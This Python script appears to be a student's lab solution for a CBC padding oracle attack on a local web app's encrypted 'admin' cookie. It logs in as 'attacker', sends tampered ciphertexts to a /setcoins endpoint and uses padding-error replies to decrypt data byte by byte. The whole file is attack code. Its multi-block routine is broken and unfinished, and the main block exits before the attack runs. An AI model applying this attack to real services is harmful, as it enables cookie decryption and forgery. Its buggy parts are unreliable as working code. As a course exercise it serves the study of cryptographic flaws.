import os
import requests
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.primitives.ciphers import algorithms

from cryptography.hazmat.backends import default_backend
from requests import codes, Session
import base64
import binascii
import copy

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

# You should implement this padding oracle object
# to craft the requests containing the mauled
# ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(algorithms.AES.block_size/8)

    @property
    def block_length(self):
        return self._block_size_bytes

    # you'll need to send the provided ciphertext
    # as the admin cookie, retrieve the request,
    # and see whether there was a padding error or not.
    def test_ciphertext(self, ciphertext_blocks):
        # print(ciphertext_blocks)
        sess = Session()
        username = "attacker"
        password = "attacker"
        login_data_dict = {"username": username,
                         "password": password,
                         "login": "Login"
                         }
        response = sess.post(LOGIN_FORM_URL, login_data_dict)
        assert (response.status_code == codes.ok)

        sess.cookies.set('admin', ciphertext_blocks, domain='localhost.local', path='/')
        setcoin_data_dict = {"username": "attacker",\
                             "amount": '0'}
        response = sess.post(self.url, setcoin_data_dict)
        return "Bad padding for admin cookie!" not in response.text


def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext (bytearray)
    """
    print("po_attack_2blocks")
    print("ctx: ", ctx)
    assert len(ctx) == 2 * po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0_hex_bytearray, c1_hex_bytearray = list(split_into_blocks(ctx, po.block_length))
    print("c0 c1: ", c0_hex_bytearray, c1_hex_bytearray)
    intermediate = bytearray(16)
    msg_bytes = bytearray(16)
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    for i in range(1, 17):
        c0 = copy.deepcopy(c0_hex_bytearray)
        c1 = copy.deepcopy(c1_hex_bytearray)
        for k in range(i):
            c0[-k] = intermediate[-k] ^ i
        hit = False
        for j in range(256):
            c0[-i] = j
            test_cipher = (c0 + c1).hex()
            valid = po.test_ciphertext(test_cipher)
            if i == 1 and valid:
                print("i = 1 found: ", j)
                c0[-2] ^= 1
                test_cipher = (c0 + c1).hex()
                if po.test_ciphertext(test_cipher):
                    hit = True
                    break
            elif valid:
                hit = True
                print("found: ", j)
                break
        assert hit
        intermediate[-i] = i ^ j
        m_byte = c0_hex_bytearray[-i] ^ intermediate[-i]
        msg_bytes[-i] = m_byte

    print("msg_bytes: ", msg_bytes)
    print(binascii.hexlify(msg_bytes))
    msg = bytes(msg_bytes).decode('utf-8')
    print(msg)
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messages.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    msg_blocks = []
    for i in range(nblocks-1):
        msg_blocks.append(po_attack_2blocks(po, "".join([ctx_blocks[-i-1], ctx_blocks[-i]])))
        break
    msg_blocks = msg_blocks[::-1]
    print(msg_blocks)
    print(msg_blocks.decode("hex"))
    print(msg_blocks[1:].decode("hex"))
    
    # TODO: Implement padding oracle attack for arbitrary length message.

if __name__=='__main__':
    po = PaddingOracle(SETCOINS_FORM_URL)
    from app.api.encr_decr import Encryption

    encryption_key = b'\x00' * 16
    cbc = Encryption(encryption_key)
    password = 'a'
    ct = cbc.encrypt(password.encode('utf-8')).hex()
    print(po.test_ciphertext(ct))
    quit()
    # ct = "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
    ctxt_bytes = bytearray.fromhex(ct)
    # print(ctxt_bytes)
    # print("len(ctxt_bytes): ", len(ctxt_bytes))
    ctxt_new = ctxt_bytes[-32:]
    print("new: ", po.test_ciphertext(ctxt_new.hex()))

    # print("ciphertext[-32:], ", po.test_ciphertext(ct[-32:]))
    # print("ciphertext[-48:], ", po.test_ciphertext(ct[-48:]))
    # print("ciphertext[-64:], ", po.test_ciphertext(ct[-64:]))

    po_attack_2blocks(po, ctxt_new)
    # print("ct: ", ct)
    # print(len(ct))
    # try:
    #     print("can decrypt")
    #     print(cbc.decrypt(bytes.fromhex(ct)))
    # except:
    #     print("no")

    # print(po.test_ciphertext("d98b69b2fe71dc14e92a14bcbcc67e65514a32de7727dbc9d93f0ba0112029bd"[-32:]))
    # print(po.test_ciphertext('d98b69b2fe71dc14e92a14bcbcc67e65514a32de7727dbc9d93f0ba0112029bd'))